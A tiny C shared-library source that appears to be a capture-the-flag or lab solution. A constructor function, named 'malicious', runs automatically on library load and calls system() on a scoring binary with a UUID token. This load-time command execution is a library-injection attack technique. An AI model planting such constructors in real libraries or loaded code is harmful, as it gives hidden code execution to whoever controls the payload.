#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 88e2aa0e-756d-43eb-a8c3-dac1ba8f7435");
}